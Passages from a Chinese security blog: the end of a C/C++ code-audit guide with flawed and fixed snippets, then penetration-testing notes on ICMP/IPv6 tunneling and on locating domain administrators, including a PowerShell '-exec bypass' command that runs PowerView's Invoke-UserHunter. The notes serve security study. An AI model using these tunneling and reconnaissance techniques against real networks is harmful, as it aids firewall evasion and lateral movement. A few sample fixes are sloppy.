在这个示例中，代码cont3.erase(i,j)执行的erase操作，其中i迭代器指向容器cont1，j迭代器指向容器cont2，而调用该方法的容器为cont3，这将导致未定义行为发生。 12345void foo(set&lt;int&gt; &amp;cont1, set&lt;int&gt; &amp;cont2, set&lt;int&gt; &amp;cont3) &#123; set&lt;int&gt;::iterator i = cont1.find(100); set&lt;int&gt;::iterator j = cont2.find(200); cont3.assign(i, j);&#125; 修复12345678void foo(set&lt;int&gt; &amp;cont1, set&lt;int&gt; &amp;cont2) &#123; set&lt;int&gt;::iterator i = cont1.find(100); if (i != cont1.end()) &#123; i = cont2.find(100); if (i != cont2.end()) cont2.erase(i); &#125;&#125; 迭代器失效当迭代器失效后，再次使用迭代器进行数据修改将会导致未定义行为。 Demo示例代码中，函数试图从cont中删除所有的与“x”相等的元素，但是在调用cont.erase(i)后将会导致迭代器i失效，因此在i++时将会产生未定义行为。 1234567void foo(list&lt;int&gt; &amp;cont, int x) &#123; list&lt;int&gt;::iterator i; for (i = cont.begin(); i != cont.end(); i++) &#123; if (*i == x) cont.erase(i); &#125;&#125; 修复这个修复用例将cont.erase(i)的返回值赋值给i，避免了迭代器i的失效。 123456789void foo(list&lt;int&gt; &amp;cont, int x) &#123; list&lt;int&gt;::iterator i; for (i = cont.begin(); i != cont.end();) &#123; if (*i == x) i = cont.erase(i); else i++; &#125;&#125; 对迭代器尾部进行解引用对容器的迭代器进行解引用时，当迭代器指向容器的end()或者rend()，都将产生未定义行为。 Demo例1，如果break语句没有得到执行，i将会等于cont.end()。这样对i进行解引用将会产生未定义行为。 12345678910111213#include &lt;set&gt;using namespace std;int foo(set&lt;int&gt; &amp;cont) &#123; int x = 0; set&lt;int&gt;::iterator i; for (i = cont.begin(); i != cont.end(); i++) &#123; x += *i; if (x &gt; 100) break; &#125; x += *i; return x;&#125; 例2，如果“cont”容器为空,i将会等于cont.end()。这样对i进行解引用将会产生未定义行为。 12345678#include &lt;set&gt;using namespace std;int foo(set&lt;int&gt; &amp;cont) &#123; set&lt;int&gt;::iterator i = cont.begin(); if (*i &lt; 100) return *i; return 100;&#125; 修复迭代器解引用前进行有效性验证，避免迭代器对尾部进行解引用。 例1，在这个解决方案中对i值进行判断，判断是否等于cont.end()。 123456789101112int foo(set&lt;int&gt; &amp;cont) &#123; int x = 0; set&lt;int&gt;::iterator i; for (i = cont.begin(); i != cont.end(); i++) &#123; x += *i; if (x &gt; 100) break; &#125; if (i != cont.end()) x += *i; return x;&#125; 例2，在这个解决方案中对i在解引用前进行检测判断其值是否等于cont.end()。 123456int foo(set&lt;int&gt; &amp;cont) &#123; set&lt;int&gt;::iterator i = cont.begin(); if ((i != cont.end()) &amp;&amp; (*i &lt; 100)) return *i; return 100;&#125; 0x0C IO相关问题使用无效句柄当申请一个资源失败后，仍然继续使用该资源，就会导致程序崩溃。 Demo示例中，如果socket()调用失败，再调用close()使用该句柄就会导致程序崩溃。 123456789101112#include &lt;mqueue.h&gt;#include &lt;stdio.h&gt;void bad() &#123; int sockfd; struct sockaddr my_addr; if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) &#123; ; &#125; else &#123; ; &#125; close(sockfd);&#125; 修复在资源申请时应当考虑异常情况的处理。 123456789101112#include &lt;mqueue.h&gt;#include &lt;stdio.h&gt;void good() &#123; int sockfd; struct sockaddr my_addr; if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) &#123; ; &#125; else &#123; return; &#125; close(sockfd);&#125; 错误的资源关闭程序员手动创建或申请的资源，通常应当进行相应的释放或关闭操作。选用的释放或关闭方法应当和创建或申请的方法相对应，否则，会造成程序运行未定义行为，甚至造成程序运行崩溃。 Demo代码中通过库函数fopen()打开文件指针fp，然后试图通过调用Windows API对其进行关闭，该行为会造成程序运行未定义行为。 1234void f() &#123; FILE *fp = fopen(\"some_file.txt\", \"r\"); CloseHandle((HANDLE)fp);&#125; 修复调用和创建或申请资源相对应的释放或关闭方法。 1234void f() &#123; FILE *fp = fopen(\"some_file.txt\", \"r\"); fclose(fp);&#125; 0x0D 加解锁相关问题加锁未解锁所有的针对互斥量的加锁解锁操作，都必须针对同一模块，并且在同一抽象层面进行。否则，将会可能导致某些加锁/解锁操作不会依照多线程设计而被执行，甚至依照锁的类型，最终导致死锁、资源竞争等其他漏洞的爆发。 缺少对锁的有效释放，会导致死锁。如果锁被占用并未被有效释放，后续对该加锁资源的操作将无法被执行，直到该锁得到有效释放。 为避免锁竞争，应当： 尽可能的缩小保存锁的代码； 不要对有可能产生并行问题（例如数据竞争）的模块进行加锁； 避免环路等待条件； 如果使用了多个锁，尤其是在一个递增的守护模式（guard pattern），一定要确保在各种情况下增量的等同。 Demo示例中，函数foo()在最开始位置进行了加锁操作，但如果switch的case为0，该锁将无法被有效释放。 123456789101112#include &lt;pthread.h&gt;extern int z();void foo(pthread_mutex_t *mutex) &#123; pthread_mutex_lock(mutex); switch (z()) &#123; case 0: return; case 1: break; &#125; pthread_mutex_unlock(mutex);&#125; 修复检查代码逻辑，详细排查每条代码可能的执行路径，避免加锁未释放。 12345678910111213#include &lt;pthread.h&gt;extern int z();void foo(pthread_mutex_t *mutex) &#123; pthread_mutex_lock(mutex); switch (z()) &#123; case 0: pthread_mutex_unlock(mutex); return; case 1: break; &#125; pthread_mutex_unlock(mutex);&#125; 不当的锁初始化所有的针对互斥量的加锁解锁操作，都必须针对同一模块，并且在同一抽象层面进行。否则，将会可能导致某些加锁/解锁操作不会依照多线程设计而被执行，甚至依照锁的类型，最终导致死锁、资源竞争等其他漏洞的爆发。 在对资源进行加锁/解锁操作前，很多的库都需要对锁进行初始化操作，并在完成对锁资源进行加锁/解锁操作后，对锁进行清理。对锁资源不当的初始化，会造成程序运行逻辑错误等。 Demo示例中，对已经初始化了的锁资源进行了冗余的初始化。 12345#include &lt;pthread.h&gt;void foo(pthread_mutex_t *mutex) &#123; pthread_mutex_init(mutex); pthread_mutex_init(mutex);&#125; 修复删除冗余的锁资源初始化代码。 1234#include &lt;pthread.h&gt;void foo(pthread_mutex_t *mutex) &#123; pthread_mutex_init(mutex);&#125; 0x0E 不安全的内存拷贝函数有一些C/C++函数没有考虑安全性，例如内存拷贝函数memcpy。禁止使用这些不安全的函数是一种移除代码缺陷的非常好的方式。 Demo123void bad(void *dest, const void *src, size_t count) &#123; memcpy(dest, src, count);&#125; 修复不要使用不安全的内存拷贝函数memcpy，应该使用一些安全的函数来代替这些被禁止使用的函数。 0x0F 其他污点数据问题无论输入的数据是由用户直接输入，还是从环境中读取，都应当对该值的类型、长度、格式以及范围等进行验证。未经验证的值都应被视为污染数据。 如果输入的数据没有经过有效的验证，攻击者就可能会将该数据篡改为程序不期望的数据形式。接受了与预期不符的数据类型，会造成程序控制逻辑泄漏、资源泄漏甚至被植入可执行代码。 该种情况下，攻击者可以： 提供不合规的值造成程序运行崩溃； 造成过多的资源消耗； 读取机密数据； 通过恶意输入篡改数据或改变控制流； 执行有风险的命令。 污点数据作为循环边界Demo函数中，循环次数由用户直接输入，而未进行验证。该行为可被攻击者控制。 12345678void iterateFoo_bad() &#123; unsigned num; int i; scanf(\"%u\", &amp;num); for (i = 0; i &lt; num; i++) &#123; foo(); &#125;&#125; 修复为避免污染输入错误，应当： 了解每个不可信源可能输入到程序的位置，包括：函数参数、cookies、网络数据读取、环境变量、逆向DNS、查询结果、文件名、数据库以及任何外部系统； 为输入数据提供一个白名单，或者“已知合理的”输入情况，而非仅仅依赖黑名单以及“输入不当”的输入情况； 确保输入数据的所有属性都合适，包括长度、类型、范围、输入丢失或额外输入、语法以及连贯性等； 如果应用的客户端存在安全验证，确保该验证在服务端同样存在； 如果输入数据由多处输入拼合而成，在完成拼合后，对该数据进行验证。 Demo中，添加了对污点数据的前置判断，避免了过多次数的循环。 12345678910void iterateFoo_good() &#123; unsigned num; int i; scanf(\"%u\", &amp;num); if (num &gt; 20) return; for (i = 0; i &lt; num; i++) &#123; foo(); &#125;&#125; 污染配置直接将污点数据作为参数传递给对系统进行配置的库函数、API，会为恶意攻击者提供篡改操作系统的可能性，进而对操作系统造成破坏。 Demo示例中，函数SetFileAttributes()对文件进行属性设置，其属性值是污点数据，该行为会导致文件的属性可被攻击者任意设置。 12345#include &lt;Windows.h&gt;void f(LPCTSTR lpFileName, DWORD dwFileAttributes) &#123; scanf(\"%d\", &amp;dwFileAttributes); SetFileAttributes(lpFileName, dwFileAttributes);&#125; 修复示例中，通过if语句，对CASE情况进行判断，进而决定对文件属性值进行具体的设置，即用预先获知的可能的固定情况，代替了污点数据，保证了文件属性的安全性。 12345678#include &lt;Windows.h&gt;void f(LPCTSTR lpFileName) &#123; if ( CASE1 ) &#123; SetFileAttributes(lpFileName, dwFileAttributes_value_1 ); &#125; else if ( CASE2 ) ｛ SetFileAttributes(lpFileName, dwFileAttributes_value_2 ); &#125;&#125; 目录穿越如题，不多说。 进程控制直接将污点数据作为动态库加载路径，会为攻击者提供加载恶意库的机会，攻击者可以将篡改后的，带有恶意功能的库进行加载，使程序在运行过程中执行危险动作，甚至被攻击者控制。 Demo示例中，函数LoadLibrary()加载库的参数为污点数据。 12345#include &lt;Windows.h&gt;void f(LPCTSTR lpFileName) &#123; scanf(\"%s\", lpFileName); LoadLibrary(lpFileName);&#125; 修复用明确的固定的数据来进行动态库加载，如果加载动态库的参数，确实需要从外界获取，在这种情况下，应该设计并实现完备的验证机制。 示例中，函数LoadLibrary()加载库的参数经过了校验函数CheckArgStr()的验证。 123456#include &lt;Windows.h&gt;void f(LPCTSTR lpFileName) &#123; scanf(\"%s\", lpFileName); lpFileName = CheckArgStr(lpFileName); LoadLibrary(lpFileName);&#125; 资源注入在调用库函数、API进行资源操作的时候，如果相关的参数是污点数据，传入的资源可能会被污染，甚至篡改。 Demo示例中，函数CreateEvent()创建事件对象的名称为污点数据。 123456#include &lt;Windows.h&gt;void f(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPTSTR lpName) &#123; scanf(\"%s\", lpName); CreateEvent(lpEventAttributes, bManualReset, bInitialState, lpName);&#125; 修复示例中，函数CreateEvent()创建事件对象的名称经过了校验函数CheckArgStr()的验证。 1234567#include &lt;Windows.h&gt;void f(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPTSTR lpName) &#123; scanf(\"%s\", lpName); lpName = CheckArgStr(lpName); CreateEvent(lpEventAttributes, bManualReset, bInitialState, lpName);&#125; 日志伪造将被污染的数据写入系统日志中，会导致系统日志记录的数据混乱。 Demo示例中，syslog()将被污染的数据str记录到了系统日志中。 12345#include &lt;syslog.h&gt;void f(int priority, const char *format, char *str) &#123; scanf(\"%s\", str); syslog(priority, format, str);&#125; 修复确保写入日志的数据的正确性，如果确定要将用户输入的某些污点数据写入到日志文件中，应当确保该数据和其他数据加以区分并处理，以免用户输入的污点数据对日志记录造成影响。 0x10 错误的内存释放对象释放的对象并非动态分配的内存，这种错误的释放操作会导致严重的错误。不要对不是由标准内存分配函数malloc(), calloc(), realloc(), 或 aligned_alloc()所返回的指针调用free()。 向realloc()提供一个指向非动态分配的指针也会产生类似的情况，realloc()函数用于改变一块动态内存的大小。如果向realloc()提供一个指向并非由标准内存分配函数分配的指针，程序行为未定义。结果导致程序异常终止。 Demo例1，这个不规范的代码样例，根据argc的值，设置c_str引用动态申请内存或非静态的string字符串。无论哪种情况，c_str都被当作参数传递给了free()。如果任何的其他不同于动态分配内存被c_str引用，在调用free(c_str)的时候都将出现错误。 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;enum &#123; MAX_ALLOCATION = 1000 &#125;;int main(int argc, const char *argv[]) &#123; char *c_str = NULL; size_t len; if (argc == 2) &#123; len = strlen(argv[1]) + 1; if (len &gt; MAX_ALLOCATION) &#123; /* Handle error */ &#125; c_str = (char *)malloc(len); if (c_str == NULL) &#123; /* Handle error */ &#125; strcpy(c_str, argv[1]); &#125; else &#123; c_str = \"usage: $&gt;a.exe [string]\"; printf(\"%s\\n\", c_str); &#125; free(c_str); return 0;&#125; 例2，realloc()代码样例中，指向realloc()函数返回值的指针buf，没有引用动态分配内存。 123456789#include &lt;stdlib.h&gt;enum &#123; BUFSIZE = 256 &#125;;void f(void) &#123; char buf[BUFSIZE]; char *p = (char *)realloc(buf, 2 * BUFSIZE); if (p == NULL) &#123; /* Handle error */ &#125;&#125; 修复例1：代码样例消除了在调用free()函数之前，c_str引用非动态分配内存的可能。 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;enum &#123; MAX_ALLOCATION = 1000 &#125;;int main(int argc, const char *argv[]) &#123; char *c_str = NULL; size_t len; if (argc == 2) &#123; len = strlen(argv[1]) + 1; if (len &gt; MAX_ALLOCATION) &#123; /* Handle error */ &#125; c_str = (char *)malloc(len); if (c_str == NULL) &#123; /* Handle error */ &#125; strcpy(c_str, argv[1]); &#125; else &#123; printf(\"%s\\n\", \"usage: $&gt;a.exe [string]\"); return EXIT_FAILURE; &#125; free(c_str); return 0;&#125; 例2（realloc()）：在这个规范的代码样例中，buf引用了动态分配内存。 123456789#include &lt;stdlib.h&gt;enum &#123; BUFSIZE = 256 &#125;;void f(void) &#123; char *buf = (char *)malloc(BUFSIZE * sizeof(char)); char *p = (char *)realloc(buf, 2 * BUFSIZE); if (p == NULL) &#123; /* Handle error */ &#125;&#125; 注意，realloc()即使在malloc()失败的情况下，依然会表现出正确的行为。因为realloc()在给予null指针的情况下与malloc()行为相同。 0x11 内存泄漏函数内部分配内存且返回后没有在外部做任何变量赋值保存，这种情况会造成指向分配内存的指针丢失。 当一个类在构造函数中申请动态内存但是没有在析构函数中释放内存时，会导致内存泄漏。在赋值运算符中也会存在潜在的内存泄漏问题。当一个类在构造函数中执行动态内存分配并且在赋值运算符中重写相应的指针时，没有提前释放内存或者减少自身的引用计数，这会导致内存泄漏。 Demo例1，alloc_data() 分配的内存没有变量保存返回的内存指针，导致内存泄漏。 123456void* alloc_data() &#123; return malloc(10);&#125;void foo() &#123; alloc_data();&#125; 例2，类C在构造函数中申请内存，但是缺少析构函数。即使有除了析构函数之外的方法释放分配的内存，也有可能在使用这样的类时造成内存泄漏。 123456class C &#123; char *data; public: C() &#123; data = new char[10]; &#125; //...&#125;; 即使是一个没有使用过的对象的简单声明也会导致内存泄漏。 123void foo()&#123; C c;&#125; 例3，ip指向的内存在被重写之前没有被释放。由于在构造函数中已经为这个指针分配了内存，这个赋值操作会导致可能的内存泄漏。 123456789101112131415class C &#123; public: C() &#123; ip = new int; &#125; ~C() &#123; delete ip; &#125; C &amp;operator=(const C &amp;rhs) &#123; if (this == &amp;rhs) return *this; ip = new int; // memory pointed by ip is leaked *ip = *rhs.ip; return *this; &#125; private: C(const C &amp;); int *ip;&#125;; 例4，在内存重写之前，cp所指向的内存的引用计数没有减少会导致内存泄漏。 12345678910111213141516171819202122232425262728class counted &#123; public: counted() &#123; counter = 1; &#125; void addRef() &#123; counter++; &#125; void decRef() &#123; counter--; if (counter == 0) delete this; &#125; private: int counter;&#125;;class C2 &#123; public: C2() &#123; cp = new counted(); &#125; ~C2() &#123; cp-&gt;decRef(); &#125; C2 &amp;operator=(const C2 &amp;rhs) &#123; if (this == &amp;rhs) return *this; cp = rhs.cp; cp-&gt;addRef(); return *this; &#125; private: C2(const C2 &amp;); counted *cp;&#125;; 修复例1： 1234567void* alloc_data() &#123; return malloc(10);&#125;void foo() &#123; void* ptr = alloc_data(); free(ptr);&#125; 例2，在析构函数中释放分配的内存： 1234567class C &#123; char *data; public: C() &#123; data = new char[10]; &#125; ~C() &#123; delete data; &#125; //...&#125;; 例3，ip指向的动态分配的内存在赋值之前已经被释放了： 12345678910111213141516class C &#123; public: C() &#123; ip = new int; &#125; ~C() &#123; delete ip; &#125; C &amp;operator=(const C &amp;rhs) &#123; if (this == &amp;rhs) return *this; delete ip; ip = new int; // memory pointed by ip is leaked *ip = *rhs.ip; return *this; &#125; private: C(const C &amp;); int *ip;&#125;; 例4，增加了引用计数减少操作，保证了引用计数的正确计算，从而保证不会发生内存泄漏： 1234567891011121314151617181920212223242526272829class counted &#123; public: counted() &#123; counter = 1; &#125; void addRef() &#123; counter++; &#125; void decRef() &#123; counter--; if (counter == 0) delete this; &#125; private: int counter;&#125;;class C2 &#123; public: C2() &#123; cp = new counted(); &#125; ~C2() &#123; cp-&gt;decRef(); &#125; C2 &amp;operator=(const C2 &amp;rhs) &#123; if (this == &amp;rhs) return *this; cp-&gt;decRef(); cp = rhs.cp; cp-&gt;addRef(); return *this; &#125; private: C2(const C2 &amp;); counted *cp;&#125;; 0x12 对指针进行sizeof操作使用sizeof对指针进行取值，很有可能出现对取值结果的错误理解。因为对指针进行sizeof操作将会返回指针的大小而非指针指向对象的大小。 如果要对指针进行取值，应当使用指针类型作为参数，如下代码: 1sizeof（int *） 因为用户显式的指明了指针类型，可以确保sizeof的意图是明确的。 有时也会出现对指针解引用的sizeof操作，如下代码： 12int *p = a;sizeof(*p); 上述代码中使用了对指针的解引用操作，可以表明编码者理解sizeof操作的结果输出，明确是对指针所指向对象进行sizeof操作。 Demo代码中，sizeof(ps)操作，对指针进行操作，获取的结果并非指针指向的内存区域的长度，而是指针的长度。 1234567#include &lt;memory.h&gt;struct S &#123; int x, y;&#125;;void zero_S(struct S *ps) &#123; memset(ps, 0, sizeof(ps));&#125; 修复使用sizeof(*ps)或者sizeof(struct S)都可以将示例修复。 12345678#include &lt;memory.h&gt;struct S &#123; int x, y;&#125;;void zero_S(struct S *ps) &#123; memset(ps, 0, sizeof(*ps)); memset(ps, 0, sizeof(struct S));&#125; 0x13 整数回绕造成的逻辑问题因常量值超出变量取值范围造成的二元逻辑判断恒真或恒假，将导致程序逻辑判断失去意义。这种类型的问题可以通过改变变量的范围区间，使其包含常量值，从而避免二元逻辑判断恒真或恒假。 Demo代码中，i定义为unsigned char，其取值范围在0～255之间，这将导致i&lt;256恒成立，循环无法终止。 1234567void foo() &#123; unsigned char i; int a[256]; for(i=0;i&lt;256;i++) &#123; a[i]=1; &#125;&#125; 修复通过修改i变量类型为int，扩大其取值区间，保证循环可以顺利终止。 1234567void foo() &#123; int i; int a[256]; for(i=0;i&lt;256;i++) &#123; a[i]=1; &#125;&#125; 0x14 参考代码审计–40–新篇章之C/C++代码审计（一）","tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://www.mi1k7ea.com/tags/代码审计/"},{"name":"C/C++","slug":"C-C","permalink":"https://www.mi1k7ea.com/tags/C-C/"}]},{"title":"隐藏通信隧道技术之网络层&传输层","date":"2021-01-16T06:19:05.000Z","path":"2021/01/16/隐藏通信隧道技术之网络层-传输层/","text":"0x00 参考《内网安全攻防》笔记。 0x01 隐藏通信隧道基础知识概述隧道是指一种绕过端口屏蔽的通信方式。 防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。 常见的隧道如下： 网络层：IPv6隧道、ICMP隧道、GRE隧道； 传输层：TCP隧道、UDP隧道、常规端口转发； 应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道； 判断内网连通性判断内网的连通性一般是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、HTTPS、DNS、ICMP等）及端口通信的情况。常见的允许流量流出的端口有80/8080/443/53/110/123等。 常见的内网连通性判断方法如下。 ICMP协议1ping &lt;IP地址或域名&gt; TCP协议NetCat是使用TCP/UDP协议进行网络连接读写数据的工具，可以使用其进行扫描判断： 1nc -zv &lt;IP地址 端口号&gt; 在Windows中下载nc程序运行也是可以的： HTTP协议可以使用curl命令来探测内网连通性。如果远程主机开启了相应的端口，会输出相应的端口信息；如果未开启，则没有任何提示。 1curl 192.168.1.3:80 在Windows中下载curl程序运行也是可以的： DNS协议一般的，使用nslookup和dig命令来进行DNS连通性检测。 nslookup是Windows自带的DNS探测命令，用法如下： 1nslookup domain [dns-server] 在没有指定DNS服务器，就采用系统默认的DNS服务器，即nslookup会从系统网络的TCP/IP属性中读取DNS服务器的地址。 一般的使用方法是输入nslookup命令，再输入help命令。 dig是Linux默认自带的DNS探测命令，用法如下： 1dig @[dns-server] www.baidu.com 在没有指定DNS服务器时，dig会到/etc/resolv.conf文件中读取系统配置的DNS服务器的地址。如果DNS服务器为192.168.43.1，将解析百度网的IP地址，说明目前DNS协议是连通的。 具体使用方法可通过dig -h命令来获取。 内网流量不能直接流出还存在一种情况就是内网的流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。 这种场景常用的内网连通性判断方法如下： 查看网络连接，判断是否存在与其他机器的8080（非绝对）等端口的连接（可尝试运行ping -n 1 -a ip命令）； 查看内网中是否有主机名类似于”proxy”的机器； 查看IE浏览器的直接代理； 根据pac文件的路径（可能是本地路径，也可能是远程路径），将其下载下来并查看； 执行如下命令，利用curl工具进行确认： 1234// 不通curl www.baidu.com// 通curl -x proxy-ip:port www.baidu.com 0x02 网络层隧道技术在网络层中，常用的隧道协议是IPv6和ICMP。 IPv6隧道IPv6（Internet Protocol Version 6）是互联网工程任务组（IETF）设计的用于替代IPv4的下一代IP协议，其地址数量号称可以为全世界的每一粒沙子编上一个地址。 目前，由于IPv4资源几乎耗尽，IPv6开始进入过渡阶段。 IPv6隧道技术简介IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，是IPv6报文能够在IPv4海洋中传输，从而到达另一个IPv6小岛。 IPv6隧道的工作过程如图： 节点A要向节点B发送IPv6报文，首先需要在节点A和节点B之间建立一条隧道； 节点A将IPv6报文封装在以节点B的IPv4地址为目的地址、以自己的IPv4地址为源地址的IPv4报文中，并发往IPv4海洋； 在IPv4海洋中，这个报文和普通IPv4报文一样，经过IPv4的转发到节点B； 节点B接收到次报文之后，解除IPv4封装，取出其中的IPv6报文； 由于现阶段的边界设备、防火墙以及入侵检测系统还无法识别IPv6的通信数据，而大多数的操作系统是支持IPv6的，所以需要进行人工配置。如下： 攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。注意，即使设备支持IPv6，但也可能无法正确解析封装了IPv6报文的IPv4数据包。 配置隧道和自动隧道的主要区别：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时，如果采用的是自动隧道方法，就无需去配置。 配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，比如采用DHCP、人工配置或其他IPv4的配置机制。 支持IPv6的隧道工具有socat、6tunnel、nt6tunnel等。 防御IPv6隧道攻击的方法针对IPv6隧道攻击，最好的防御方法就是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。 ICMP隧道ICMP隧道简单实用。在一般的通信协议中，如果两台设备要进行通信，则必须开放端口，但在ICMP协议下就不需要。 最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相对应的回复和请求。 在一些网络环境中，如果攻击者使用各类上层隧道（如HTTP隧道、DNS隧道、常规正反向端口转发等）进行的的操作都失败了，通常就会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（一般不会屏蔽ping数据包），实现不受限制的网络访问。 常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等。 icmpshicmpsh工具使用简单且易于跨平台，运行时不需要管理员权限。 使用Git Clone命令下载icmpsh：https://github.com/inquisb/icmpsh.git 安装Python的impacket类库，以便于TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"内网信息收集之域相关信息收集二","date":"2020-12-22T14:12:58.000Z","path":"2020/12/22/内网信息收集之域相关信息收集二/","text":"0x00 参考《内网安全攻防》笔记。 0x01 定位域管理员定位域管理员是内网渗透测试关键的一环。与外网渗透测试获取某台服务器权限的目标不同的是，内网渗透测试的目标一般是获取特定机器的权限或者特定用户，进而获得特定的资源，对内网的安全性进行评估。 基本概述一般的，内网中会部署一些网络安全系统和设备，如IDS、IPS、日志审计、安全网关、反病毒软件等等。在域网络渗透测试中，获取域内一个支点之后，需要获取域管理员权限。 在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。换句话说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，且具备完全控制权限。 定位域内管理员的常规方法有两个： 日志：指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看； 会话：指域内每台机器的登录会话，可以使用netsess.exe或PowerView等工具来查询（可匿名查询，无需权限）； 常用域管理员定位工具这里假设已经在Windows域中取得了普通用户权限，要想在域内横向移动， 需要知道域内用户登录的位置、是否是任何系统的本地管理员、所属的组、是否有权访问文件共享等。 常用的域管理员定位工具包括psloggedon.exe、PVEFindADUser.exe、netsess.exe、hunter、NetView、PowerView等。 psloggedon.exe在Windows中，可以使用net session命令来查看哪些用户使用了本机资源，但是没有命令可以用来查看哪个用户在使用远程计算机资源、哪个用户登录了本地或远程计算机。 如果没有用户登录使用的话，默认就是空的： 当有用户使用到本地资源是可以看到的，但是看不到哪个用户在使用远程计算机资源： 使用本小节的工具就可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定的是用户名而不是计算机名，则会搜索网上邻居中的计算机并显示该用户当前是否已经登录。原理是通过检查注册表HKEY_USERS项的key值来查询哪些用户登录过（需要调用NetSessionEnum API），但某些功能需要管理员权限才能使用。 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon 使用命令： 1psloggedon [- ] [-l] [-x] [\\\\computername | username] -：显示支持的选项和用于输出值的单位； -l：仅显示本地登录，不显示本地和网络资源登录； -x：不显示登录时间； \\\\computename：指定要列出登录信息的计算机名称； username：指定用户名，在网络中搜索该用户登录的计算机； PVEFindADUser.exe该工具用于查找活动目录用户登录的位置、枚举域用户以及查找在特定计算机上登录的用户，包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要有.NET Framework 2.0环境，并且需要具有管理员权限。 下载地址：https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn 使用命令： 1PVEFindADUser.exe &lt;parameters&gt; 参数说明参考GitHub即可。 示例中，-current参数会获取域中所有计算机上当前登录的所有用户，并将结果保存到report.csv文件中： netview.exe该工具是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum来查询登录会话，利用NetShare来查询共享，利用NetWkstaUserEnum来枚举登录的用户，还能查询共享入口和有价值的用户。其中的绝大部分功能不需要管理员权限就可以使用。 下载地址：https://github.com/mubix/netview 使用命令： 1netview.exe &lt;参数&gt; 参数说明参考GitHub即可。 NetSess.exe默认情况下执行net session可能会没权限，此时直接运行这个工具就可以了： Nmap的NSE脚本如果存在域账户或者本地账号，就可以使用Nmap的smb-enum-sessions.nse引擎来获取远程计算机中的登录会话（无需管理员权限）。 下载地址：https://nmap.org/nsedoc/scripts/smb-enum-sessions.html 本地搭建的环境扫描不出，不知道哪的问题，待解决： PowerView脚本PowerView是PowerShell脚本，提供辅助定位关键用户的功能。 下载地址：https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView Invoke-StealthUserHunter：只需要进行一次查询，就可以获取域里所有用户。使用方法为从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSessions获取。因为无需使用Invoke-UserHunter对每台机器进行操作，所以该方法的隐蔽性相对较高，但涉及的机器不一定全面。PowerView默认使用Invoke-StealthUserHunter，如果找不到就使用Invoke-UserHunter。 Invoke-UserHunter：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用Get-NetSessions和Get-NetLoggedon（调用NetSessionEnum和NetWkstaUserEnum API）扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时无需管理员权限。 示例，PowerShell下绕过脚本加载直接运行命令： 1powershell.exe -exec bypass -Command \"&amp; &#123;Import-Module .\\PowerView.ps1;Invoke-UserHunter&#125;\" Empire的user_hunter模块Empire的user_hunter模块用于查找域管理员登录的机器。 使用usemodule powershell/situational_awareness/network/powerview/user_hunter模块可以查询是哪个用户登录了哪台主机。 本地环境测试没查询到相关内容： 0x02 查找域管理进程在内网渗透中，一般进行域权限提升都是通过收集明文凭据或通过mimikatz提权来实现，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。 但是如果内网环境比较复杂，无法快速地在拥有权限的系统中获得域管理员进程，那么通常可以采用这种方法：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。 假设存在如下场景：攻击者在某个内网环境中获得了一个域普通用户的权限，首先通过各种方法来获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表和会话信息、知道哪些用户登录了这台服务器。如果攻击者通过分析发现，可以获取权限的登录用户都不是域管理员用户，同时没有域管理员组中的用户登录这台服务器，就可以使用另一个账户并寻找该账户在内网的哪台机器上具有管理权限，在枚举这台机器上的登录用户，然后继续进行内网渗透，直至找到一个可以获取域管理员权限的有效路径为止。在一个包含成千上万台计算机和众多用户的内网环境中，完成这个过程需要花费相当长的时间。 本机查询查询域管理员列表1net group \"Domain Admins\" 